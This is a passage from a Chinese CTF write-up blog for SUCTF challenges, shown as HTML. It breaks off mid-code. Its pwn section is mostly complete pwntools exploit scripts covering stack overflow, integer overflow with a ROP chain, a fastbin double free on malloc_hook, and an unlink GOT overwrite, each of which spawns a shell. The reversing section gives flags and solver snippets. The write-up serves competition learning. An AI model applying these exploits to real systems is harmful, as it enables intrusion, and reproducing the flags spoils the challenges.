+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"><span class="comment"># p = remote("127.0.0.1",20000)</span></span><br><span class="line"></span><br><span class="line">researchfield = <span class="number">0x602100</span></span><br><span class="line">p = process(<span class="string">"./eofs"</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">padding = <span class="string">"a"</span>*<span class="number">50</span> + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">padding += (<span class="number">178</span>-len(padding))*<span class="string">"a"</span></span><br><span class="line">padding += p64(researchfield)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genHeader</span><span class="params">(raw)</span>:</span></span><br><span class="line">    header = <span class="string">'''\</span></span><br><span class="line"><span class="string">GET / HTTP/1.1#\</span></span><br><span class="line"><span class="string">Host: 127.0.0.1:8000#\</span></span><br><span class="line"><span class="string">Username: Doublemice#\</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">    <span class="keyword">if</span> len(raw) &lt; <span class="number">50</span>:</span><br><span class="line">        result = <span class="string">"#ResearchField:"</span> + raw</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        group = re.findall(<span class="string">r'.&#123;50&#125;'</span>,raw)</span><br><span class="line">        result = <span class="string">"#ResearchField:"</span>.join(group)</span><br><span class="line">        <span class="keyword">if</span> len(raw)%<span class="number">50</span>:</span><br><span class="line">            result += <span class="string">"#ResearchField:"</span> + raw[len(raw)-len(raw)%<span class="number">50</span>:]</span><br><span class="line">    header += result</span><br><span class="line">    header +=<span class="string">"#"</span></span><br><span class="line">    <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line">p.sendline(genHeader(padding))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>拓展阅读：</p>
+<ul>
+<li><a href="https://gsec.hitb.org/materials/sg2018/WHITEPAPERS/FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf" target="_blank" rel="noopener">FILE Structures - Another Binary Exploitation Technique - An-Jie Yang.pdf</a></li>
+<li><a href="https://talosintelligence.com/vulnerability_reports/TALOS-2018-0684" target="_blank" rel="noopener">CVE-2018-4013/TALOS-2018-0684</a></li>
+</ul>
+<h3 id="babyarray"><a href="#babyarray" class="headerlink" title="babyarray"></a>babyarray</h3><p>简单的数组溢出，index=-14 value=0，就可以把a的值覆盖掉。<br>需要注意的是一个int型变量四字节，所以在整型数组中的一个偏移变量地址改变4，计算数组距离全局变量a的值再除4就得到了偏移值。<br>这是一道不需要exp的题目。</p>
+<h3 id="basic-pwn"><a href="#basic-pwn" class="headerlink" title="basic-pwn"></a>basic-pwn</h3><p>简单的栈溢出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;gdb 3.out</span><br><span class="line">&gt;disas callThisFun</span><br><span class="line">Dump of assembler code for function _Z11callThisFunv:</span><br><span class="line">   0x00000000004005c7 &lt;+0&gt;:	push   %rbp</span><br><span class="line">   0x00000000004005c8 &lt;+1&gt;:	mov    %rsp,%rbp</span><br><span class="line">   0x00000000004005cb &lt;+4&gt;:	sub    $0x20,%rsp</span><br><span class="line">   0x00000000004005cf &lt;+8&gt;:	lea    0x11e(%rip),%rax        # 0x4006f4</span><br><span class="line">   0x00000000004005d6 &lt;+15&gt;:	mov    %rax,-0x20(%rbp)</span><br><span class="line">   0x00000000004005da &lt;+19&gt;:	lea    0x11c(%rip),%rax        # 0x4006fd</span><br><span class="line">......</span><br><span class="line">&gt;q</span><br><span class="line">&gt;python -c &apos;print &quot;A&quot;*280 +  &quot;\xc7\x05\x40\x00\x00\x00\x00\x00&quot; &apos; | ./3.out</span><br></pre></td></tr></table></figure>
+<h3 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h3><p>简单栈溢出，和上一题重复了23333<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">"./pwn"</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x28</span>+p64(<span class="number">0x400676</span>)</span><br><span class="line">io.sendlineafter(<span class="string">"============================\n"</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
+<h3 id="int-overflow-pwn"><a href="#int-overflow-pwn" class="headerlink" title="int_overflow_pwn"></a>int_overflow_pwn</h3><p>整数溢出，分配小空间，但是可以拷贝更多的内容</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> alloc_len = st-&gt;len + <span class="number">0x20</span>;   <span class="comment">// 整数溢出</span></span><br><span class="line"><span class="keyword">char</span> *data  = alloca(alloc_len);</span><br><span class="line">  </span><br><span class="line">read(<span class="number">0</span>, data + <span class="keyword">sizeof</span>(struct file) , st-&gt;len); <span class="comment">// 栈溢出</span></span><br></pre></td></tr></table></figure>
+<p>具体看 <code>exp</code> </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">binary_path = <span class="string">"../dist/pwn"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(binary_path)</span></span><br><span class="line">p = remote(<span class="string">"172.17.0.2"</span>, <span class="number">20000</span>)</span><br><span class="line">r = ROP(binary_path)</span><br><span class="line">bin = ELF(binary_path)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line">pop_rdi_ret = r.find_gadget([<span class="string">'pop rdi'</span>, <span class="string">'ret'</span>]).address</span><br><span class="line"></span><br><span class="line">info(<span class="string">"pop_rdi_ret: &#123;&#125;"</span>.format(hex(pop_rdi_ret)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"welcome....."</span>)</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x6e696b53</span>)</span><br><span class="line">payload += p32(<span class="number">0x1</span>)</span><br><span class="line">payload += p32(<span class="number">0xffffffff</span>)  <span class="comment"># int overflow to alloc small size memory</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">124</span>)</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(bin.got[<span class="string">'puts'</span>])</span><br><span class="line">payload += p64(bin.plt[<span class="string">'puts'</span>])</span><br><span class="line">payload += p64(bin.entry) <span class="comment"># ret to main</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc.address = leak - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">info(<span class="string">"libc.address: &#123;&#125;"</span>.format(hex(libc.address)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x6e696b53</span>)</span><br><span class="line">payload += p32(<span class="number">0x1</span>)</span><br><span class="line">payload += p32(<span class="number">0xffffffff</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">124</span>)</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(libc.search(<span class="string">"sh\x00"</span>).next())</span><br><span class="line">payload += p64(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">payload += p64(bin.entry) <span class="comment"># ret to main</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="EZ-heap"><a href="#EZ-heap" class="headerlink" title="EZ_heap"></a>EZ_heap</h3><p>首先利用unsorted bin进行泄露，发现存在uaf，double free之后利用fastbin attack写malloc hook来get shell，这里直接贴下exp了。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">"linux"</span>, arch=<span class="string">"amd64"</span>)</span><br><span class="line">ip =<span class="string">""</span></span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn"</span>)</span><br><span class="line"><span class="comment">#libc = ELF("./libc-2.23.so")</span></span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(s)</span>:</span></span><br><span class="line">    p.sendline(s)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(s)</span>:</span></span><br><span class="line">    p.send(s)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc</span><span class="params">(timeout=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> timeout == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> p.recv()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> p.recv(timeout=timeout)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(s, timeout=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> timeout == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> p.recvuntil(s)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> p.recvuntil(s, timeout=timeout)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(msg=<span class="string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">''</span>)</span><br><span class="line">    pause()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getshell</span><span class="params">()</span>:</span></span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,name,kind)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice : "</span>)</span><br><span class="line">    sl(<span class="string">"1"</span>)</span><br><span class="line">    ru(<span class="string">"Length of the name :"</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">"The name of animal :"</span>)</span><br><span class="line">    sd(name)</span><br><span class="line">    ru(<span class="string">"The kind of the animal :"</span>)</span><br><span class="line">    sl(kind)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice : "</span>)</span><br><span class="line">    sl(<span class="string">"2"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remote</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice : "</span>)</span><br><span class="line">    sl(<span class="string">"3"</span>)</span><br><span class="line">    ru(<span class="string">"Which animal do you want to remove from the cage:"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clean</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice : "</span>)</span><br><span class="line">    sl(<span class="string">"4"</span>)</span><br><span class="line">create(<span class="number">0x98</span>,<span class="string">"a"</span>*<span class="number">8</span>,<span class="string">"1234"</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">"b"</span>*<span class="number">8</span>,<span class="string">"b"</span>*<span class="number">8</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">"b"</span>*<span class="number">8</span>,<span class="string">"b"</span>*<span class="number">8</span>)</span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">"b"</span>*<span class="number">8</span>,<span class="string">"b"</span>*<span class="number">8</span>)</span><br><span class="line">remote(<span class="number">0</span>)</span><br><span class="line">clean()</span><br><span class="line">create(<span class="number">0x98</span>,<span class="string">"c"</span>*<span class="number">8</span>,<span class="string">"c"</span>*<span class="number">8</span>)</span><br><span class="line">check()</span><br><span class="line">ru(<span class="string">"c"</span>*<span class="number">8</span>)</span><br><span class="line">leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">libc_base = leak <span class="number">-0x58</span><span class="number">-0x10</span> -libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"leak-----&gt;"</span>+hex(leak)</span><br><span class="line">malloc_hook = libc_base +libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"malloc_hook-----&gt;"</span>+hex(malloc_hook)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base-----&gt;"</span>+hex(libc_base)</span><br><span class="line">one_gadget = <span class="number">0xf02a4</span> + libc_base</span><br><span class="line">remote(<span class="number">1</span>)</span><br><span class="line">remote(<span class="number">2</span>)</span><br><span class="line">remote(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">create(<span class="number">0x68</span>,p64(malloc_hook<span class="number">-0x23</span>),<span class="string">"b"</span>*<span class="number">4</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">"b"</span>*<span class="number">8</span>,<span class="string">"b"</span>*<span class="number">8</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">"b"</span>*<span class="number">8</span>,<span class="string">"b"</span>*<span class="number">8</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">"a"</span>*<span class="number">0x13</span>+p64(one_gadget),<span class="string">"b"</span>*<span class="number">4</span>)</span><br><span class="line">remote(<span class="number">1</span>)</span><br><span class="line">remote(<span class="number">1</span>)</span><br><span class="line">getshell()</span><br></pre></td></tr></table></figure></p>
+<h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p>一道有点烦的unlink题，具体利用思路请看exp。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="comment">#p = remote('localhost',4448)</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x : p.recvuntil(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x : p.sendline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x : p.send(x)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">''</span>)</span><br><span class="line">    raw_input()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">touch</span><span class="params">(sz)</span>:</span></span><br><span class="line">    ru(<span class="string">"please chooice :"</span>)</span><br><span class="line">    sl(<span class="string">"1"</span>)</span><br><span class="line">    ru(<span class="string">"please input the size :"</span>)</span><br><span class="line">    sl(str(sz))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    ru(<span class="string">"please chooice :"</span>)</span><br><span class="line">    sl(<span class="string">"2"</span>)</span><br><span class="line">    ru(<span class="string">"which node do you want to delete"</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    ru(<span class="string">"please chooice :"</span>)</span><br><span class="line">    sl(<span class="string">"3"</span>)</span><br><span class="line">    ru(<span class="string">"which node do you want to show"</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    <span class="keyword">return</span> ru(<span class="string">"1. touch"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">take_note</span><span class="params">(idx,con)</span>:</span></span><br><span class="line">    ru(<span class="string">"please chooice :"</span>)</span><br><span class="line">    sl(<span class="string">"4"</span>)</span><br><span class="line">    ru(<span class="string">"which one do you want modify :"</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">"please input the content"</span>)</span><br><span class="line">    sd(con)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    buf_addr = <span class="number">0x00000000006020C0</span></span><br><span class="line">    touch(<span class="number">0x30</span>) <span class="comment">#0</span></span><br><span class="line">    touch(<span class="number">0x30</span>) <span class="comment">#1</span></span><br><span class="line">    touch(<span class="number">0x30</span>) <span class="comment">#2</span></span><br><span class="line">    touch(<span class="number">0x30</span>) <span class="comment"># construct fake chunk</span></span><br><span class="line">    touch(<span class="number">0x90</span>) <span class="comment"># free this chunk</span></span><br><span class="line">    touch(<span class="number">0x30</span>) <span class="comment"># avoid malloc_conslidate</span></span><br><span class="line">    <span class="comment"># note_payload fake chunk</span></span><br><span class="line">    </span><br><span class="line">    note_payload = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(buf_addr) </span><br><span class="line">    note_payload += p64(buf_addr + <span class="number">0x8</span>)</span><br><span class="line">    note_payload += <span class="string">'a'</span> * <span class="number">0x10</span></span><br><span class="line">    note_payload += p64(<span class="number">0x30</span>)</span><br><span class="line">    note_payload += p64(<span class="number">0xa0</span>)  <span class="comment"># bypass double free (!prev)  this_chunk + size --&gt; prev_inuse bit</span></span><br><span class="line">    </span><br><span class="line">    take_note(<span class="number">3</span>,note_payload)</span><br><span class="line">    </span><br><span class="line">    delete(<span class="number">4</span>)</span><br><span class="line">    take_note(<span class="number">3</span>,p64(elf.got[<span class="string">'__libc_start_main'</span>]))</span><br><span class="line">    leak_got = show(<span class="number">0</span>).split(<span class="string">'\n'</span>)[<span class="number">2</span>]</span><br><span class="line">    leak_got = leak_got.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    leak_got = u64(leak_got)</span><br><span class="line">    success(<span class="string">"leak_got == &gt; "</span>+hex(leak_got))</span><br><span class="line">    obj = LibcSearcher(<span class="string">'__libc_start_main'</span>,leak_got)</span><br><span class="line">    libc_base = leak_got - obj.dump(<span class="string">'__libc_start_main'</span>)</span><br><span class="line">    success(<span class="string">"libc_base == &gt; "</span>+hex(libc_base))</span><br><span class="line">    system = libc_base + obj.dump(<span class="string">"system"</span>)</span><br><span class="line">    success(<span class="string">"system == &gt; "</span>+hex(system))</span><br><span class="line">    take_note(<span class="number">3</span>,p64(elf.got[<span class="string">'free'</span>]))  <span class="comment"># modify index 0 point</span></span><br><span class="line">    take_note(<span class="number">2</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    take_note(<span class="number">0</span>,p64(system))</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">        </span><br><span class="line">    p.interactive()    </span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure></p>
+<h2 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h2><h3 id="table"><a href="#table" class="headerlink" title="table"></a>table</h3><p>flag:SUCTF{1S_iT_SiMp1e?yeS}<br>这题前面有两个wrong那里是反调试，如果想动态调试的话需要patch掉<br>分两步变换<br>有一个table表为{ 3,7,4,2,5,6,1,9,8,10 };<br>第一次变换为7 第二次变换为9<br>动态调试发现中间值比了一个相等（这个字符串不能直接看出来）</p>
+<p>str1 = ‘_SiST_1’<br>str2 = ‘’<br>table = [ 3,7,4,2,5,6,1,9,8,10]<br>table_r = [7,4,1,3,5,6,2,9,8,10]<br>for i in range(7):<br>&nbsp;&nbsp;str2 += str1[table_r[i]-1]<br>str1 = ‘py1Me?iSe’<br>for i in range(9):<br>&nbsp;&nbsp;str2 += str1[table_r[i]-1]<br>print(str2)  </p>
+<h3 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h3><p>flag:SUCTF{birthday_ro2k0}<br>题目提示是hash，看到bf772f6ed89838b9gb9f7abf3cc09413可以猜测应该是md5<br>md5算法的最明显的特征是初始化的四个数是不变的。<br>但是bf772f6ed89838b9gb9f7abf3cc09413这个数是经过一个变换，将偶数的地方异或了一个一。<br>最后的cf673f7ee88828c9fb8f6acf2cb08403  可查出为birthday<br>第二段为一个简单的线性变换<br><code>str1 = &#39;</code>ut9t’<br>for i in range(len(str1)):<br>&nbsp;&nbsp;a = chr(ord(str1[i])-2*i-1)<br>&nbsp;&nbsp;print(a)`</p>
+<h3 id="re-register"><a href="#re-register" class="headerlink" title="re-register"></a>re-register</h3><p>flag: SUCTF{Flag_1cqeyoecnaqr739w}<br>src:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line"></span><br><span class="line">char a[] = &#123;&apos;S&apos;-1, &apos;U&apos;-1, &apos;C&apos;-1, &apos;T&apos;-1, &apos;F&apos;-1, &apos;&#123;&apos;-1, &apos;F&apos;-1, &apos;l&apos;-1, &apos;a&apos;-1, &apos;g&apos;-1, &apos;_&apos;-1, &apos;1&apos;-1, &apos;c&apos;-1, &apos;q&apos;-1, &apos;e&apos;-1, &apos;y&apos;-1, &apos;o&apos;-1, &apos;e&apos;-1, &apos;c&apos;-1, &apos;n&apos;-1, &apos;a&apos;-1, &apos;q&apos;-1, &apos;r&apos;-1, &apos;7&apos;-1, &apos;3&apos;-1, &apos;9&apos;-1, &apos;w&apos;-1, &apos;&#125;&apos;-1, 0&#125;;</span><br><span class="line">int i = strlen(a);</span><br><span class="line">int j = 0;</span><br><span class="line">while (i--)&#123;</span><br><span class="line">	if (getchar()-1 !=a[j])(printf(&quot;wrong!&quot;),exit(-1));</span><br><span class="line">	j++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="basic-re"><a href="#basic-re" class="headerlink" title="basic re"></a>basic re</h3><p>ida中可以看出输入的密钥只用到后16位 所以0~65535爆就行了。</p>
+<p>Key：12345</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//src：</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> 